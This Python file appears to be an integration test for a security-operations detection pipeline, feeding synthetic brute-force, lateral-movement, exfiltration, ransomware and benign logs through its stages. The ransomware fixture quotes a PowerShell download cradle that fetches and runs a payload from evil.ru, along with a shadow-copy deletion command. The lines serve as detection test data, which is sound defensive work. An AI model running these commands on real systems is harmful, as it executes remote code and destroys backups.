"""
test_pipeline.py
----------------
End-to-end integration test for the full SOC Analyst pipeline.

Tests ALL pipeline stages WITHOUT requiring the FastAPI server to be running.
Runs directly against the Python modules.

Run from project root:
  python scripts/test_pipeline.py

Optionally test a specific scenario:
  python scripts/test_pipeline.py --scenario ransomware
  python scripts/test_pipeline.py --scenario lateral
  python scripts/test_pipeline.py --scenario exfil
  python scripts/test_pipeline.py --scenario normal
"""

import sys
import os
import json
import argparse
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.log_normalizer import normalize_logs
from backend.event_extractor import extract_events, events_to_sequence
from backend.session_builder import build_sessions, sessions_summary
from backend.threat_intel import enrich_events
from backend.attack_graph import build_attack_graph, attack_graph_summary
from backend.lstm_model import score_sequence
from backend.incident_report import generate_report, format_report_text

# ── Sample test scenarios ─────────────────────────────────────────────────────
SCENARIOS = {
    "bruteforce": """\
2024-01-15 03:22:11 Failed password for admin from 185.220.101.5 port 54231 ssh2
2024-01-15 03:22:14 Failed password for admin from 185.220.101.5 port 54234 ssh2
2024-01-15 03:22:17 Failed password for root from 185.220.101.5 port 54237 ssh2
2024-01-15 03:22:20 Failed password for ubuntu from 185.220.101.5 port 54240 ssh2
2024-01-15 03:22:23 Failed password for administrator from 185.220.101.5 port 54243 ssh2
2024-01-15 03:22:31 Accepted password for admin from 185.220.101.5 port 54251 ssh2
2024-01-15 03:22:31 pam_unix(sshd:session): session opened for user admin by (uid=0)
2024-01-15 03:22:45 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
2024-01-15 03:23:10 Suspicious process: mimikatz executed as root (hash: d38e2f6b...)""",

    "lateral": """\
2024-01-15 09:14:03 User jsmith authenticated to WORKSTATION-01 via NTLM
2024-01-15 09:14:45 PsExec executed on FILESERVER-02 from WORKSTATION-01 by jsmith
2024-01-15 09:15:12 Net use \\\\FILESERVER-02\\ADMIN$ established from WORKSTATION-01
2024-01-15 09:15:20 cmd.exe launched as SYSTEM on FILESERVER-02 remotely
2024-01-15 09:16:05 Mimikatz process detected on FILESERVER-02 (hash: d38e2f6b...)
2024-01-15 09:16:40 LSASS memory access by non-system process on FILESERVER-02
2024-01-15 09:17:10 Pass-the-hash attempt to DC-01 from FILESERVER-02 using administrator hash
2024-01-15 09:17:55 Successful authentication to DC-01 from FILESERVER-02 (NTLM, administrator)""",

    "exfil": """\
2024-01-15 14:30:01 Large file transfer initiated from 192.168.1.105 to 45.33.32.156
2024-01-15 14:30:15 DNS query storm: 192.168.1.105 querying suspicious.exfil-domain.ru
2024-01-15 14:31:00 Outbound traffic spike: 2.4 GB via port 443 to 45.33.32.156 in 60 seconds
2024-01-15 14:32:10 7zip compression of /var/data/customers/ detected on 192.168.1.105
2024-01-15 14:32:45 Encrypted archive uploaded via HTTPS to cloud storage (45.33.32.156)
2024-01-15 14:33:20 Base64-encoded payloads in DNS TXT records from 192.168.1.105
2024-01-15 14:34:55 DLP alert: PII data pattern matched in outbound traffic from 192.168.1.105""",

    "ransomware": """\
2024-01-15 22:01:05 Suspicious macro execution in Word document: invoice_Q4.docm
2024-01-15 22:01:10 PowerShell.exe spawned by WINWORD.EXE (parent PID 4832)
2024-01-15 22:01:15 PowerShell download cradle: IEX(New-Object Net.WebClient).DownloadString('http://evil.ru/payload')
2024-01-15 22:01:22 C2 beacon established to 91.108.4.1:8080 from HOST-FINANCE-03
2024-01-15 22:02:00 Volume Shadow Copy deletion: vssadmin delete shadows /all /quiet
2024-01-15 22:02:10 Mass file rename detected: .docx -> .locked on FILESERVER-01 shares
2024-01-15 22:02:40 Backup service stopped: veeambackupsvc terminated by ransomware process
2024-01-15 22:03:00 README_DECRYPT.txt created in 1,452 directories on FILESERVER-01""",

    "normal": """\
2024-01-15 09:01:12 Accepted password for alice from 10.0.0.45 port 22
2024-01-15 09:05:33 File opened: /home/alice/reports/Q4_summary.xlsx
2024-01-15 09:12:01 File saved: /home/alice/reports/Q4_summary.xlsx
2024-01-15 09:25:44 Outbound HTTPS connection to api.company.com:443 from 10.0.0.45
2024-01-15 09:30:00 File opened: /var/log/app.log
2024-01-15 09:45:17 pam_unix(sshd:session): session closed for user alice""",
}


def divider(title: str):
    print(f"\n{'─' * 60}")
    print(f"  {title}")
    print(f"{'─' * 60}")


def run_pipeline(raw_logs: str, scenario_name: str, skip_llm: bool = True) -> dict:
    """
    Run all pipeline stages (without LLM by default to avoid API calls during testing).
    """
    print(f"\n{'=' * 60}")
    print(f"  SOC ANALYST PIPELINE TEST  —  Scenario: {scenario_name.upper()}")
    print(f"{'=' * 60}")

    # ── Stage 1: Log Normalization ────────────────────────────────────────────
    divider("Stage 1: Log Normalization")
    normalized = normalize_logs(raw_logs)
    print(f"  Input lines     : {len(raw_logs.splitlines())}")
    print(f"  Normalized logs : {len(normalized)}")
    for i, log in enumerate(normalized[:3]):
        print(f"  [{i}] action={log['action']!r:20s} ip={log['source_ip'] or '—':16s} sev={log['severity']}")
    if len(normalized) > 3:
        print(f"  ... and {len(normalized)-3} more")

    # ── Stage 2: Event Extraction ─────────────────────────────────────────────
    divider("Stage 2: Event Extraction")
    events = extract_events(normalized)
    event_types = [e.event_type for e in events]
    sequence = events_to_sequence(events)
    print(f"  Events extracted: {len(events)}")
    print(f"  Sequence        : {event_types}")
    print(f"  Int encoding    : {sequence}")
    for e in events[:4]:
        print(f"  [{e.event_type:16s}] {e.description}")

    # ── Stage 3: Session Building ─────────────────────────────────────────────
    divider("Stage 3: Session Building")
    sessions = build_sessions(events)
    sess_summary = sessions_summary(sessions)
    print(f"  Sessions found  : {sess_summary['total_sessions']}")
    print(f"  Total events    : {sess_summary['total_events']}")
    for s in sessions:
        print(f"  Session [{s.session_id}] actor={s.actor} "
              f"events={s.event_count} severity={s.severity_max} "
              f"types={s.unique_types}")

    # ── Stage 4: LSTM Anomaly Detection ──────────────────────────────────────
    divider("Stage 4: LSTM Anomaly Detection")
    anomaly_score = score_sequence(sequence)
    bar_len = int(anomaly_score * 40)
    bar = "█" * bar_len + "░" * (40 - bar_len)
    level = "CRITICAL" if anomaly_score >= 0.8 else "HIGH" if anomaly_score >= 0.6 \
        else "MEDIUM" if anomaly_score >= 0.4 else "LOW" if anomaly_score >= 0.2 else "NORMAL"
    print(f"  Anomaly Score   : {anomaly_score:.4f}")
    print(f"  Level           : {level}")
    print(f"  [{bar}] {anomaly_score:.3f}")

    # ── Stage 5: Threat Intelligence ─────────────────────────────────────────
    divider("Stage 5: Threat Intelligence Enrichment")
    ti_report = enrich_events(events)
    ti_dict = ti_report.to_dict()
    print(ti_report.summary_text())
    print(f"  Overall Risk    : {ti_dict['overall_risk']}")
    print(f"  Max Risk Score  : {ti_dict['max_risk_score']}/100")

    # ── Stage 6: Attack Graph ─────────────────────────────────────────────────
    divider("Stage 6: Attack Graph Reconstruction")
    graph = build_attack_graph(events)
    print(attack_graph_summary(graph))
    print(f"  Nodes: {graph['node_count']}  Edges: {graph['edge_count']}")
    print(f"  Nodes: {[n['id'] for n in graph['nodes']]}")
    print(f"  Edges: {[(e['source'], e['target']) for e in graph['edges']]}")

    # ── Stage 7: Incident Report (no LLM) ────────────────────────────────────
    divider("Stage 7: Incident Report Generation (LLM skipped in test)")
    mock_llm = (
        f"attack_stage: {graph.get('kill_chain_stage', 'Unknown')}\n"
        f"mitre_technique: T1110 Brute Force, T1059 Command Execution\n"
        f"severity: {'HIGH' if anomaly_score >= 0.6 else 'MEDIUM'}\n"
        f"confidence: {int(anomaly_score * 100)}%\n"
        f"explanation:\n- Attack sequence detected: {' → '.join(event_types[:6])}\n"
        f"- Anomaly score: {anomaly_score:.3f}\n"
        f"recommended_actions:\n- Isolate affected hosts\n- Reset compromised credentials\n"
        f"- Review SIEM alerts\n- Apply patches"
    )

    report = generate_report(
        sessions=[s.to_dict() for s in sessions],
        anomaly_score=anomaly_score,
        threat_intel=ti_dict,
        attack_graph=graph,
        llm_output=mock_llm,
        raw_logs=raw_logs,
    )

    print(format_report_text(report))

    # ── Summary ───────────────────────────────────────────────────────────────
    divider("PIPELINE SUMMARY")
    print(f"  Scenario         : {scenario_name}")
    print(f"  Normalized logs  : {len(normalized)}")
    print(f"  Events extracted : {len(events)}")
    print(f"  Sessions         : {sess_summary['total_sessions']}")
    print(f"  Anomaly score    : {anomaly_score:.4f}  ({level})")
    print(f"  Threat intel risk: {ti_dict['overall_risk']}")
    print(f"  Kill-chain stage : {graph['kill_chain_stage']}")
    print(f"  Severity         : {report['severity']}")
    print(f"  Confidence       : {report['confidence'] * 100:.1f}%")
    print(f"\n  Incident ID: {report['incident_id']}")
    print(f"\n  ✓ All pipeline stages completed successfully!")
    print("=" * 60)

    return report


def main():
    parser = argparse.ArgumentParser(description="SOC Analyst Pipeline Integration Test")
    parser.add_argument(
        "--scenario",
        choices=list(SCENARIOS.keys()) + ["all"],
        default="all",
        help="Which scenario to test (default: all)",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Output report as JSON",
    )
    args = parser.parse_args()

    if args.scenario == "all":
        scenarios_to_run = list(SCENARIOS.keys())
    else:
        scenarios_to_run = [args.scenario]

    results = {}
    for name in scenarios_to_run:
        report = run_pipeline(SCENARIOS[name], name, skip_llm=True)
        results[name] = report

    if args.json:
        print("\n\n" + json.dumps(results, indent=2))

    print(f"\n✓ Tested {len(scenarios_to_run)} scenario(s): {', '.join(scenarios_to_run)}")


if __name__ == "__main__":
    main()
